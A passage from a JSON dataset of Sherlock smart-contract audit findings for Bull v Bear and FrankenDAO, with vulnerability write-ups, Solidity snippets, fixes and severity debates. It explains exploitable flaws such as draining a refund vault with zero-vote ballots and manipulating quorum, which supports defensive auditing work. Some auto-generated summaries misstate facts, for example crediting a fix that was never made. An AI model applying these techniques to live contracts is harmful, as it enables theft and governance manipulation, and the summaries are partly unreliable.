`matchedOrders[contractId].maker != address(0)`\n\n## Discussion\n\n**datschill**\n\nPR fixing this issue : https://github.com/BullvBear/bvb-solidity/pull/4",
      "summary": "\nThis bug report is about an issue found in the BvB Protocol where attackers can use a fake order to trick `reclaimContract()` and transfer assets from BvB to address(0). This can result in a serious loss of funds. \n\nThe fake order needs to meet three requirements: \n\n1. `block.timestamp > order.expiry` \n2. `!settledContracts[contractId]` \n3. `!reclaimedContracts[contractId]` \n\nThe first one is easy to fulfill, and the others are all satisfied since the fake order couldn’t be settled or reclaimed before. If the asset’s implementation doesn’t make sure `to != address(0)`, the asset would be sent to address(0).\n\nThe bug was found by GimelSec, bin2chen, Ruhum, kirk-baird, \\_\\_141345\\_\\_, 0x52, carrot, hansfriese. The code snippet can be found at https://github.com/sherlock-audit/2022-11-bullvbear/blob/main/bvb-protocol/src/BvbProtocol.sol#L417-L443.\n\nThe bug can be fixed by checking `bulls[contractId] != address(0)` or `matchedOrders[contractId].maker != address(0)`. A pull request fixing this issue can be found at https://github.com/BullvBear/bvb-solidity/pull/4.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bull v Bear",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bullvbear-judging/issues/127",
      "tags": [
        "Validation"
      ],
      "finders": [
        "0x52",
        "bin2chen",
        "Ruhum",
        "kirk-baird",
        "hansfriese",
        "\\_\\_141345\\_\\_",
        "GimelSec",
        "carrot"
      ]
    },
    {
      "id": "5670",
      "title": "M-10: Veto function should decrease proposalsPassed (and possibly proposalsCreated)",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/9 \n\n## Found by \nneumo, Trumpero\n\n## Summary\nWhen a proposal that has passed is vetoed, the proposer still has the bonus of `proposalsCreated` and `proposalsPassed` related to the proposal. Both should be decremented because `veto` is intended to be used for malicious proposals.\n\n## Vulnerability Detail\nThe function `getCommunityVotingPower` returns a bonus to users for voting, creating proposals and having them passed.\nhttps://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Staking.sol#L520-L541\nThe `veto` function is supposed to be used against malicious proposals (see comment in line 522):\nhttps://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Governance.sol#L520-L534\nSo the malicius proposer should not keep a bonus based in this proposal's creation and/or passing, and the function should decrease both the values of `proposalsCreated` and `proposalsPassed`. \n\n## Impact\nMalicious proposer keeps bonus after his proposal is vetoed.\n\n## Code Snippet\nN/A\n\n## Tool used\n\nManual Review\n\n## Recommendation\nPut a check in the `veto` function that decreases the values of both  `proposalsCreated` and `proposalsPassed`.\n```solidity\nif(proposal.verified){\n\t--userCommunityScoreData[proposal.proposer].proposalsCreated;\n\t--totalCommunityScoreData.proposalsCreated;\n}\nif (state(_proposalId) == ProposalState.Queued){\n\t--userCommunityScoreData[proposal.proposer].proposalsPassed;\n\t--totalCommunityScoreData.proposalsPassed;\n}\n```\n\n## Discussion\n\n**ZakkMan**\n\nFixed: https://github.com/Solidity-Guild/FrankenDAO/pull/22\n\n\n**jack-the-pug**\n\nFix confirmed",
      "summary": "\nThis bug report is about the Veto function of the FrankenDAO project. The Veto function is intended to be used against malicious proposals, but when a proposal that has passed is vetoed, the proposer still has the bonus of `proposalsCreated` and `proposalsPassed` related to the proposal. Both should be decremented because `veto` is intended to be used for malicious proposals. This would mean that malicious proposers would not be able to keep a bonus based on the proposal's creation and passing. The bug was found by neumo and Trumpero and was fixed by ZakkMan and the fix was confirmed by jack-the-pug. The fix involved adding a check in the `veto` function that decreased the values of both  `proposalsCreated` and `proposalsPassed`.",
      "quality_score": 4,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "FrankenDAO",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/9",
      "tags": [
        "Veto"
      ],
      "finders": [
        "neumo",
        "Trumpero"
      ]
    },
    {
      "id": "5669",
      "title": "M-9: Delegate can keep can keep delegatee trapped indefinitely",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/23 \n\n## Found by \nrvierdiiev, curiousapple, 0x52\n\n## Summary\n\nUsers are allowed to delegate their votes to other users. Since staking does not implement checkpoints, users are not allowed to delegate or unstake during an active proposal if their delegate has already voted. A malicious delegate can abuse this by creating proposals so that there is always an active proposal and their delegatees are always locked to them.\n\n## Vulnerability Detail\n\n    modifier lockedWhileVotesCast() {\n      uint[] memory activeProposals = governance.getActiveProposals();\n      for (uint i = 0; i < activeProposals.length; i++) {\n        if (governance.getReceipt(activeProposals[i], getDelegate(msg.sender)).hasVoted) revert TokenLocked();\n        (, address proposer,) = governance.getProposalData(activeProposals[i]);\n        if (proposer == getDelegate(msg.sender)) revert TokenLocked();\n      }\n      _;\n    }\n\nThe above modifier is applied when unstaking or delegating. This reverts if the delegate of msg.sender either has voted or currently has an open proposal. The result is that under those conditions, the delgatee cannot unstake or delegate. A malicious delegate can abuse these conditions to keep their delegatees forever delegated to them. They would keep opening proposals so that delegatees could never unstake or delegate. A single users can only have a one proposal opened at the same time so they would use a secondary account to alternate and always keep an active proposal.\n\n## Impact\n\nDelegatees can never unstake or delegate to anyone else\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Staking.sol#L166-L174\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThere should be a function to emergency eject the token from staking. To prevent abuse a token that has been emergency ejected should be blacklisted from staking again for a certain cooldown period, such as the length of current voting period.\n\n## Discussion\n\n**zobront**\n\nIn the case that a user did this, Admins would create a contract that all \"stuck\" users approve, and they would veto and unstake all tokens in one transaction. It would be inconvenient, but no long term harm would be caused. \n\nI still think it's valid as a Medium, as this is obviously a situation we'd like to avoid being possible.\n\n**zobront**\n\nFixed: https://github.com/Solidity-Guild/FrankenDAO/pull/18\n\nThis fix addresses the risk laid out in the issue, that a delegate may repeatedly propose to keep votes locked.\n\nWe chose to not address the similar risk with voting because admins need to explicitly verify proposals before they can be voted on, so in the event this happens, admins would just hold off on verifying to give them a chance to undelegate. \n\nWe decided to go this direction because the cooldown period would add extra complexity and slightly increase gas fees on txs that we plan to refund a lot of.\n\n**jack-the-pug**\n\nFix confirmed",
      "summary": "\nThis bug report is about a vulnerability in the staking contract of the FrankenDAO. It was found by rvierdiiev, curiousapple, and 0x52. The vulnerability allows malicious delegates to keep their delegatees trapped indefinitely. This is done by the malicious delegate creating proposals so that there is always an active proposal and their delegatees are always locked to them. This means that the delegatees can never unstake or delegate to anyone else. To fix this, a function to emergency eject the token from staking was added. This will prevent abuse by blacklisting tokens that have been emergency ejected from staking for a certain cooldown period. The fix was confirmed by jack-the-pug. \n\nIn summary, this bug report was about a vulnerability in the staking contract of the FrankenDAO that allowed malicious delegates to keep their delegatees trapped indefinitely. The fix was to add a function to emergency eject the token from staking and blacklist tokens that have been emergency ejected for a certain cooldown period. The fix was confirmed and the vulnerability was addressed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "FrankenDAO",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/23",
      "tags": [],
      "finders": [
        "rvierdiiev",
        "curiousapple",
        "0x52",
        "Source: https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/23"
      ]
    },
    {
      "id": "5668",
      "title": "M-7: castVote can be called by anyone even those without votes",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/25 \n\n## Found by \nhansfriese, 0x52, Trumpero\n\n## Summary\n\nGovernance#castVote can be called by anyone, even users that don't have any votes. Since the voting refund is per address, an adversary could use a large number of addresses to vote with zero votes to drain the vault.\n\n## Vulnerability Detail\n\n    function _castVote(address _voter, uint256 _proposalId, uint8 _support) internal returns (uint) {\n        // Only Active proposals can be voted on\n        if (state(_proposalId) != ProposalState.Active) revert InvalidStatus();\n        \n        // Only valid values for _support are 0 (against), 1 (for), and 2 (abstain)\n        if (_support > 2) revert InvalidInput();\n\n        Proposal storage proposal = proposals[_proposalId];\n\n        // If the voter has already voted, revert        \n        Receipt storage receipt = proposal.receipts[_voter];\n        if (receipt.hasVoted) revert AlreadyVoted();\n\n        // Calculate the number of votes a user is able to cast\n        // This takes into account delegation and community voting power\n        uint24 votes = (staking.getVotes(_voter)).toUint24();\n\n        // Update the proposal's total voting records based on the votes\n        if (_support == 0) {\n            proposal.againstVotes = proposal.againstVotes + votes;\n        } else if (_support == 1) {\n            proposal.forVotes = proposal.forVotes + votes;\n        } else if (_support == 2) {\n            proposal.abstainVotes = proposal.abstainVotes + votes;\n        }\n\n        // Update the user's receipt for this proposal\n        receipt.hasVoted = true;\n        receipt.support = _support;\n        receipt.votes = votes;\n\n        // Make these updates after the vote so it doesn't impact voting power for this vote.\n        ++totalCommunityScoreData.votes;\n\n        // We can update the total community voting power with no check because if you can vote, \n        // it means you have votes so you haven't delegated.\n        ++userCommunityScoreData[_voter].votes;\n\n        return votes;\n    }\n\nNowhere in the flow of voting does the function revert if the user calling it doesn't actually have any votes. staking#getVotes won't revert under any circumstances. Governance#_castVote only reverts if 1) the proposal isn't active 2) support > 2 or 3) if the user has already voted. The result is that any user can vote even if they don't have any votes, allowing users to maliciously burn vault funds by voting and claiming the vote refund. \n\n## Impact\n\nVault can be drained maliciously by users with no votes\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Governance.sol#L607-L646\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nGovernance#_castVote should revert if msg.sender doesn't have any votes:\n\n        // Calculate the number of votes a user is able to cast\n        // This takes into account delegation and community voting power\n        uint24 votes = (staking.getVotes(_voter)).toUint24();\n\n    +   if (votes == 0) revert NoVotes();\n\n        // Update the proposal's total voting records based on the votes\n        if (_support == 0) {\n            proposal.againstVotes = proposal.againstVotes + votes;\n        } else if (_support == 1) {\n            proposal.forVotes = proposal.forVotes + votes;\n        } else if (_support == 2) {\n            proposal.abstainVotes = proposal.abstainVotes + votes;\n        }\n\n## Discussion\n\n**zobront**\n\nThis is great and will fix, but an adversary being able to burn a small pool put aside for gas refunds for no personal benefit seems like a Medium, not a High.\n\n**ZakkMan**\n\nFixed: https://github.com/Solidity-Guild/FrankenDAO/pull/21\n\n**jack-the-pug**\n\nFix confirmed",
      "summary": "\nThis bug report is about an issue with the Governance#castVote function in the FrankenDAO smart contract. This function can be called by anyone, even users that don't have any votes. This could allow an adversary to use a large number of addresses to vote with zero votes to drain the vault. The Governance#_castVote function only reverts if 1) the proposal isn't active 2) support > 2 or 3) if the user has already voted, but doesn't account for users with zero votes. To fix this issue, Governance#_castVote should be updated to revert if msg.sender doesn't have any votes. The bug was found by hansfriese, 0x52, and Trumpero, and confirmed fixed by ZakkMan and jack-the-pug.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "FrankenDAO",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/25",
      "tags": [
        "Vote",
        "Business Logic"
      ],
      "finders": [
        "Trumpero",
        "0x52",
        "hansfriese",
        "Source: https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/25"
      ]
    },
    {
      "id": "3750",
      "title": "M-8: Adversary can abuse delegating to lower quorum",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/24 \n\n## Found by \n0x52\n\n## Summary\n\nWhen a user delegates to another user they surrender their community voting power. The quorum threshold for a vote is determined when it is created. Users can artificially lower quorum by delegating to other users then creating a proposal. After it's created they can self delegate and regain all their community voting power to reach quorum easier. \n\n## Vulnerability Detail\n\n    // If a user is delegating back to themselves, they regain their community voting power, so adjust totals up\n    if (_delegator == _delegatee) {\n      _updateTotalCommunityVotingPower(_delegator, true);\n\n    // If a user delegates away their votes, they forfeit their community voting power, so adjust totals down\n    } else if (currentDelegate == _delegator) {\n      _updateTotalCommunityVotingPower(_delegator, false);\n    }\n\nWhen a user delegates to user other than themselves, they forfeit their community votes and lowers the total number of votes. When they self delegate again they will recover all their community voting power.\n\n        newProposal.id = newProposalId.toUint96();\n        newProposal.proposer = msg.sender;\n        newProposal.targets = _targets;\n        newProposal.values = _values;\n        newProposal.signatures = _signatures;\n        newProposal.calldatas = _calldatas;\n\n        //@audit quorum votes locked at creation\n\n        newProposal.quorumVotes = quorumVotes().toUint24();\n        newProposal.startTime = (block.timestamp + votingDelay).toUint32();\n        newProposal.endTime = (block.timestamp + votingDelay + votingPeriod).toUint32();\n\nWhen a proposal is created the quorum is locked at the time at which it's created. Users can combine these two quirks to abuse the voting.\n\nExample:\n\nAssume there is 1000 total votes and quorum is 20%. Assume 5 users each have 35 votes, 10 base votes and 25 community votes. In this scenario quorum is 200 votes which they can't achieve. Each user delegates to other users, reducing each of their votes by 25 and reducing the total number of votes of 875. Now they can create a proposal and quorum will now be 175 votes (875*20%). They all self delegate and recover their community votes. Now they can reach quorum and pass their proposal.\n\n## Impact\n\nUsers can collude to lower quorum and pass proposal easier\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Staking.sol#L286-L316\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nOne solution would be to add a vote cooldown to users after they delegate, long enough to make sure all active proposals have expired before they're able to vote. The other option would be to implement checkpoints.\n\n## Discussion\n\n**zobront**\n\nThis is clever but the impact that a small number of users can have on quorum is relatively small, and we aren't concerned.\n\n**0x00052**\n\nEscalate for 1 USDC\n\nThis is a valid issue. Even if they don't want to fix, it still has an impact on quorum which impacts proposals passing or failing. The impact is small at low quorum thresholds but at higher quorum thresholds the impact is larger.\n\nAs an example if the quorum threshold is 10% then using this technique to drop overall votes by 100 would lower quorum by 10 votes but if the threshold is 50% then it would lower quorum by 50 votes.\n\nThis decrease in quorum could allow borderline proposals to pass that normally couldn't meet quorum. Since the impact depends on the current quorum threshold (which is adjustable), medium seems appropriate to me. \n\n**sherlock-admin**\n\n > Escalate for 1 USDC\n> \n> This is a valid issue. Even if they don't want to fix, it still has an impact on quorum which impacts proposals passing or failing. The impact is small at low quorum thresholds but at higher quorum thresholds the impact is larger.\n> \n> As an example if the quorum threshold is 10% then using this technique to drop overall votes by 100 would lower quorum by 10 votes but if the threshold is 50% then it would lower quorum by 50 votes.\n> \n> This decrease in quorum could allow borderline proposals to pass that normally couldn't meet quorum. Since the impact depends on the current quorum threshold (which is adjustable), medium seems appropriate to me. \n\nYou've created a valid escalation for 1 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**zobront**\n\nI start by that this wouldn't have any substantial impact. First off, if a user delegates, they won't have any votes and therefore won't meet the threshold to create a proposal. So it would need to be a coordinated effort. And in the event that this happened, the impact would be relatively small. Seems unlikely and not impactful enough that a Medium feels like a stretch.\n\n**Evert0x**\n\nEscalation accepted. Assigning medium severity as the impact is not that significant + it requires a lot of effort to execute. \n\nThe quorum can be manipulated which can lead to unexpected behavior as illustrated. \n\n**sherlock-admin**\n\n> Escalation accepted. Assigning medium severity as the impact is not that significant + it requires a lot of effort to execute. \n> \n> The quorum can be manipulated which can lead to unexpected behavior as illustrated. \n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about an issue found in the code of a platform called Sherlock Audit. It was found by user 0x52 and is known as Issue M-8. It is about a vulnerability where users can artificially lower the quorum threshold for a vote by delegating to other users and then creating a proposal. This allows them to self delegate and regain all their community voting power to reach quorum easier. It is possible because when a proposal is created the quorum is locked at the time at which it's created and when a user delegates to user other than themselves, they forfeit their community votes and lowers the total number of votes. \n\nThe impact of this vulnerability is that users can collude to lower quorum and pass proposal easier. It can also lead to unexpected behavior as the quorum can be manipulated. \n\nThe code snippet for this issue can be found at the link provided in the report. It was found using manual review. \n\nThe recommendation for this issue is to add a vote cooldown to users after they delegate, long enough to make sure all active proposals have expired before they're able to vote. The other option would be to implement checkpoints. \n\nThe severity of this issue was accepted as medium as the impact is not that significant and it requires a lot of effort to execute. Contestants' payouts and scores will be updated according to the changes made on this issue.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "FrankenDAO",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/24",
      "tags": [
        "Vote",
        "Delegate"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "3748",
      "title": "M-6: Staking#changeStakeTime and changeStakeAmount are problematic given current staking design",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/31 \n\n## Found by \n0x52\n\n## Summary\n\nStaking#changeStakeTime and changeStakeAmount allow the locking bonus to be modified. Any change to this value will cause voting imbalance in the system. If changes result in a higher total bonus then existing stakers will be given a permanent advantage over new stakers. If the bonus is increased then existing stakers will be at a disadvantage because they will be locked and unable to realize the new staking bonus.\n\n## Vulnerability Detail\n\n    function _stakeToken(uint _tokenId, uint _unlockTime) internal returns (uint) {\n      if (_unlockTime > 0) {\n        unlockTime[_tokenId] = _unlockTime;\n        uint fullStakedTimeBonus = ((_unlockTime - block.timestamp) * stakingSettings.maxStakeBonusAmount) / stakingSettings.maxStakeBonusTime;\n        stakedTimeBonus[_tokenId] = _tokenId < 10000 ? fullStakedTimeBonus : fullStakedTimeBonus / 2;\n      }\n\nWhen a token is staked their stakeTimeBonus is stored. This means that any changes to stakingSettings.maxStakeBonusAmount or stakingSettings.maxStakeBonusTime won't affect tokens that are already stored. Storing the value is essential to prevent changes to the values causing major damage to the voting, but it leads to other more subtle issue when it is changed that will put either existing or new stakers at a disadvantage. \n\nExample:\nUser A stake when maxStakeBonusAmount = 10 and stake long enough to get the entire bonus. Now maxStakeBonusAmount is changed to 20. User A is unable to unstake their token right away because it is locked. They are now at a disadvantage because other users can now stake and get a bonus of 20 while they are stuck with only a bonus of 10. Now maxStakeBonusAmount is changed to 5. User A now has an advantage because other users can now only stake for a bonus of 5. If User A never unstakes then they will forever have that advantage over new users.\n\n## Impact\n\nVoting power becomes skewed for users when Staking#changeStakeTime and changeStakeAmount are used\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Staking.sol#L389-L415\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nI recommend implementing a poke function that can be called by any user on any user. This function should loop through all tokens (or the tokens specified) and recalculate their voting power based on current multipliers, allowing all users to be normalized to prevent any abuse.\n\n## Discussion\n\n**zobront**\n\nThis is the intended behavior. Staking windows will be relatively short (~1 month) and bonuses will change only by governance vote. We accept that there may be short periods where a user is locked in a suboptimal spot, but they can unstake and restake when the period is over.\n\n**0x00052**\n\nEscalate for 1 USDC\n\nI think this should be considered valid. It won't just be for a small amount of time if the staking amount is lowered. In this case, all users who staked beforehand will have a permanent advantage over other users. Due to the permanent imbalance lowering it would cause in the voting power of users, I think that medium is appropriate.\n\n**sherlock-admin**\n\n > Escalate for 1 USDC\n> \n> I think this should be considered valid. It won't just be for a small amount of time if the staking amount is lowered. In this case, all users who staked beforehand will have a permanent advantage over other users. Due to the permanent imbalance lowering it would cause in the voting power of users, I think that medium is appropriate.\n\nYou've created a valid escalation for 1 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**zobront**\n\nI can see the argument here. We don't want to change it and believe it's fine as is, but it may be a valid Medium.\n\n**Evert0x**\n\nEscalation accepted\n\n**sherlock-admin**\n\n> Escalation accepted\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about the Staking#changeStakeTime and changeStakeAmount functions, which allow the locking bonus to be modified. Any change to this value will cause voting imbalance in the system, as existing stakers will be given a permanent advantage over new stakers if the bonus is increased, and existing stakers will be at a disadvantage if the bonus is decreased. This is because existing stakers are locked and unable to realize the new staking bonus. To prevent this issue, a poke function should be implemented that can be called by any user on any user. This function should loop through all tokens and recalculate their voting power based on current multipliers, allowing all users to be normalized to prevent any abuse. After discussion, the issue's escalations were accepted, and contestants' payouts and scores were updated according to the changes made.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "FrankenDAO",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/31",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "3747",
      "title": "M-5: `getCommunityVotingPower` doesn't calculate voting Power correctly due to precision loss",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/48 \n\n## Found by \nElKu\n\n## Summary\n\nIn `Staking.sol`, the [getCommunityVotingPower](https://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Staking.sol#L520) function, doesn't calculate the votes correctly due to precision loss. \n\n## Vulnerability Detail\n\nIn [getCommunityVotingPower](https://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Staking.sol#L520) function, the `return` statement is where the mistake lies in:\n\n```solidity\n\treturn \n        (votes * cpMultipliers.votes / PERCENT) + \n        (proposalsCreated * cpMultipliers.proposalsCreated / PERCENT) + \n        (proposalsPassed * cpMultipliers.proposalsPassed / PERCENT);\n```\n\nHere, after each multiplication by the `Multipliers`, we immediately divide it by `PERCENT`. Every time we do a division, there is a certain amount of precision loss. And when its done thrice, the loss just accumulates. So instead, the division by `PERCENT` should be done after all 3 terms are added together. \n\nNote that this loss is not there, if the `Multipliers` are a multiple of `PERCENT`. But these values can be changed through governance later. So its better to be careful assuming that they may not always be a multiple of `PERCENT`.\n\n## Impact\n\nThe community voting power of the user is calculated wrongly.\n\n## Code Snippet\nThe `getCommunityVotingPower` function:\n\n```solidity\n    function getCommunityVotingPower(address _voter) public override view returns (uint) {\n      uint64 votes;\n      uint64 proposalsCreated;\n      uint64 proposalsPassed;\n      \n      // We allow this function to be called with the max uint value to get the total community voting power\n      if (_voter == address(type(uint160).max)) {\n        (votes, proposalsCreated, proposalsPassed) = governance.totalCommunityScoreData();\n      } else {\n        // This is only the case if they are delegated or unstaked, both of which should zero out the result\n        if (tokenVotingPower[_voter] == 0) return 0;\n\n        (votes, proposalsCreated, proposalsPassed) = governance.userCommunityScoreData(_voter);\n      }\n\n      CommunityPowerMultipliers memory cpMultipliers = communityPowerMultipliers;\n\n      return \n        (votes * cpMultipliers.votes / PERCENT) + \n        (proposalsCreated * cpMultipliers.proposalsCreated / PERCENT) + \n        (proposalsPassed * cpMultipliers.proposalsPassed / PERCENT);\n    }\n```\n\n## Tool used\n\nVSCode, Manual Analysis\n\n## Recommendation\n\nDo the division once after all terms are added together:\n\n```solidity\n      return \n        ( (votes * cpMultipliers.votes) + \n        (proposalsCreated * cpMultipliers.proposalsCreated) + \n        (proposalsPassed * cpMultipliers.proposalsPassed) ) / PERCENT;\n    }\n```\n\n## Discussion\n\n**zobront**\n\nThis is a good suggestion but don't think it warrants a Medium. All these values are intended to be > 100. In the event that votes is lowered more, it will always be the case that proposalsCreated & proposalsPassed will be greater than 100, so combining them doesn't improve the accuracy.\n\n**El-Ku**\n\nEscalate for 5 USDC\n\nIf the multipliers are not a multiple of 100, say for example 125, 150 and 175 or something like that, then the precision will be still lost. But as I myself mentioned in the report, if all the multipliers are a multiplier of 100, then these equations dont cause an issue.\n\nOtherwise we should do all the additions before doing the division. Even though the loss is still there it can be minimized by this step.\n\nI think it deserves a medium as this calculation controls many Governance functions.\n\n\n**sherlock-admin**\n\n > Escalate for 5 USDC\n> \n> If the multipliers are not a multiple of 100, say for example 125, 150 and 175 or something like that, then the precision will be still lost. But as I myself mentioned in the report, if all the multipliers are a multiplier of 100, then these equations dont cause an issue.\n> \n> Otherwise we should do all the additions before doing the division. Even though the loss is still there it can be minimized by this step.\n> \n> I think it deserves a medium as this calculation controls many Governance functions.\n> \n\nYou've created a valid escalation for 5 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**zobront**\n\nI think this makes sense and I was wrong to dispute it. It's a change we would like to make and agree there's the potential for some values to calculated incorrectly.\n\n**Evert0x**\n\nEscalation accepted\n\n**sherlock-admin**\n\n> Escalation accepted\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.\n\n**zobront**\n\nFixed: https://github.com/Solidity-Guild/FrankenDAO/pull/24\n\n**jack-the-pug**\n\nFix confirmed",
      "summary": "\nThis bug report is about an issue found in the `Staking.sol` file of the project, where the [getCommunityVotingPower](https://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Staking.sol#L520) function doesn't calculate the votes correctly due to precision loss. The mistake lies in the `return` statement, where after each multiplication by the `Multipliers`, the result is divided by `PERCENT`. This leads to precision loss which accumulates when done thrice. The community voting power of the user is thus calculated wrongly. \n\nThe code snippet for the `getCommunityVotingPower` function is provided. The recommendation is to do the division once after all terms are added together, instead of doing it thrice. This issue was disputed initially but was later accepted after further discussion. The issue was fixed and the fix was confirmed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "FrankenDAO",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/48",
      "tags": [],
      "finders": [
        "Source: https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/48",
        "ElKu"
      ]
    },
    {
      "id": "3599",
      "title": "M-7: Veto function should decrease proposalsPassed (and possibly proposalsCreated)",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/9 \n\n## Found by \nTrumpero, neumo\n\n## Summary\nWhen a proposal that has passed is vetoed, the proposer still has the bonus of `proposalsCreated` and `proposalsPassed` related to the proposal. Both should be decremented because `veto` is intended to be used for malicious proposals.\n\n## Vulnerability Detail\nThe function `getCommunityVotingPower` returns a bonus to users for voting, creating proposals and having them passed.\nhttps://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Staking.sol#L520-L541\nThe `veto` function is supposed to be used against malicious proposals (see comment in line 522):\nhttps://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Governance.sol#L520-L534\nSo the malicius proposer should not keep a bonus based in this proposal's creation and/or passing, and the function should decrease both the values of `proposalsCreated` and `proposalsPassed`. \n\n## Impact\nMalicious proposer keeps bonus after his proposal is vetoed.\n\n## Code Snippet\nN/A\n\n## Tool used\n\nManual Review\n\n## Recommendation\nPut a check in the `veto` function that decreases the values of both  `proposalsCreated` and `proposalsPassed`.\n```solidity\nif(proposal.verified){\n\t--userCommunityScoreData[proposal.proposer].proposalsCreated;\n\t--totalCommunityScoreData.proposalsCreated;\n}\nif (state(_proposalId) == ProposalState.Queued){\n\t--userCommunityScoreData[proposal.proposer].proposalsPassed;\n\t--totalCommunityScoreData.proposalsPassed;\n}\n```\n\n## Discussion\n\n**ZakkMan**\n\nFixed: https://github.com/Solidity-Guild/FrankenDAO/pull/22",
      "summary": "\nThis bug report is about the Veto function in the FrankenDAO codebase. The Veto function is intended to be used against malicious proposals, but currently, if a proposal is vetoed, the proposer still has the bonus of `proposalsCreated` and `proposalsPassed` related to the proposal. This means that the malicious proposer is still receiving a bonus for the proposal, even though it has been vetoed. The bug was found by Trumpero and Neumo, and it was fixed by ZakkMan with a pull request. The fix was to add a check in the `veto` function that decreases the values of both `proposalsCreated` and `proposalsPassed`. This ensures that malicious proposers do not receive a bonus for their proposals when they are vetoed.",
      "quality_score": 2,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "FrankenDAO",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/9",
      "tags": [],
      "finders": [
        "neumo",
        "Trumpero"
      ]
    },
    {
      "id": "3598",
      "title": "M-6: Delegate can keep can keep delegatee trapped indefinitely",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/23 \n\n## Found by \nrvierdiiev, 0x52\n\n## Summary\n\nUsers are allowed to delegate their votes to other users. Since staking does not implement checkpoints, users are not allowed to delegate or unstake during an active proposal if their delegate has already voted. A malicious delegate can abuse this by creating proposals so that there is always an active proposal and their delegatees are always locked to them.\n\n## Vulnerability Detail\n\n    modifier lockedWhileVotesCast() {\n      uint[] memory activeProposals = governance.getActiveProposals();\n      for (uint i = 0; i < activeProposals.length; i++) {\n        if (governance.getReceipt(activeProposals[i], getDelegate(msg.sender)).hasVoted) revert TokenLocked();\n        (, address proposer,) = governance.getProposalData(activeProposals[i]);\n        if (proposer == getDelegate(msg.sender)) revert TokenLocked();\n      }\n      _;\n    }\n\nThe above modifier is applied when unstaking or delegating. This reverts if the delegate of msg.sender either has voted or currently has an open proposal. The result is that under those conditions, the delgatee cannot unstake or delegate. A malicious delegate can abuse these conditions to keep their delegatees forever delegated to them. They would keep opening proposals so that delegatees could never unstake or delegate. A single users can only have a one proposal opened at the same time so they would use a secondary account to alternate and always keep an active proposal.\n\n## Impact\n\nDelegatees can never unstake or delegate to anyone else\n\n## Code 